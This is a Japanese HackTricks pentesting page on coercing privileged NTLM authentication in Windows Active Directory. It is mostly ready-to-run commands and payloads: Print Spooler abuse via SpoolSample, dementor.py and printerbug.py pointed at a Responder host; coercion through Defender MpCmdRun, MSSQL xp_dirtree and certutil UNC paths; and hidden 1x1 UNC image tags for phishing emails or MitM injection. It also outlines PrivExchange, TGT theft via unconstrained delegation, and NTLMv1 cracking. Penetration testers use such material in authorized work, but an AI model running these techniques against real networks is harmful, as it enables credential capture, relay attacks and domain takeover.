# NTLM特権認証の強制

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社の広告を掲載**したいですか？または、**PEASSの最新バージョンにアクセス**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加するか**、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**にフォローしてください。**
* **ハッキングのコツを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers)は、3rdパーティの依存関係を避けるためにMIDLコンパイラを使用してC#でコーディングされた**リモート認証トリガーのコレクション**です。

## スプーラーサービスの悪用

_**プリントスプーラー**_ サービスが**有効**であれば、既知のADクレデンシャルを使用してドメインコントローラーのプリントサーバーに新しいプリントジョブの**更新を要求**し、通知を任意のシステムに**送信するように指示**することができます。\
プリンターが任意のシステムに通知を送る際には、その**システムに対して認証を行う**必要があります。したがって、攻撃者は_**プリントスプーラー**_ サービスを任意のシステムに対して認証させることができ、この認証には**コンピュータアカウント**が使用されます。

### ドメイン上のWindowsサーバーの検出

PowerShellを使用して、Windowsボックスのリストを取得します。サーバーは通常優先されるので、そこに焦点を当てましょう：
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### スプーラーサービスのリスニングを探す

少し変更を加えた@mysmartlogin（Vincent Le Toux）の[SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)を使用して、スプーラーサービスがリスニングしているかどうかを確認します：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux上でrpcdump.pyを使用し、MS-RPRNプロトコルを探すこともできます。
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### 任意のホストに対してサービスに認証を要求する

[**こちらからSpoolSampleをコンパイルできます**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**。**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
または、Linuxを使用している場合は、[**3xocyteのdementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket)または[**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)を使用します。
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### 組み合わせて無制限委任を使用する

攻撃者が[無制限委任](unconstrained-delegation.md)を持つコンピュータを既に侵害している場合、攻撃者は**プリンタをこのコンピュータに対して認証させることができます**。無制限委任のため、**プリンタのコンピュータアカウントのTGT**は無制限委任を持つコンピュータの**メモリに保存されます**。攻撃者はこのホストを既に侵害しているため、このチケットを**取得し**、それを悪用することができます（[Pass the Ticket](pass-the-ticket.md)）。

## RCP 強制認証

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange`攻撃は、**Exchange Server `PushSubscription`機能**に見つかった欠陥の結果です。この機能により、メールボックスを持つ任意のドメインユーザーが、HTTP経由で任意のクライアント提供のホストに対してExchangeサーバーを強制的に認証させることができます。

デフォルトでは、**ExchangeサービスはSYSTEMとして実行され**、過剰な権限（具体的には、**2019年累積アップデート前のドメインにWriteDacl権限を持っています**）が与えられています。この欠陥は、情報のLDAPへのリレーを有効にし、その後ドメインNTDSデータベースを抽出するために悪用される可能性があります。LDAPへのリレーが不可能な場合でも、この欠陥はドメイン内の他のホストへのリレーと認証に依然として使用できます。この攻撃の成功した悪用は、任意の認証されたドメインユーザーアカウントで直ちにドメイン管理者へのアクセスを付与します。

## Windows内部

既にWindowsマシン内部にいる場合、特権アカウントを使用してWindowsをサーバーに接続させることができます：

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
または、この他のテクニックを使用してください： [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin（Microsoftが署名したバイナリ）を使用してNTLM認証を強制することが可能です：
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTMLインジェクション

### メール経由

対象のマシンにログインする**ユーザーのメールアドレス**がわかっている場合、**1x1画像**を含む**メールを送信**することができます。
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
彼がそれを開いたとき、認証を試みます。

### MitM

MitM攻撃をコンピュータに対して実行し、彼が閲覧するページにHTMLを注入できる場合、次のような画像をページに注入してみることができます：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLMv1のクラッキング

[NTLMv1チャレンジをキャプチャできたら、こちらでクラッキング方法を読んでください](../ntlm/#ntlmv1-attack)。\
_NTLMv1をクラックするためには、Responderのチャレンジを"1122334455667788"に設定する必要があります。_

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社を宣伝**したいですか？または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**に**フォロー**してください。**
* **[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)や[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。**

</details>
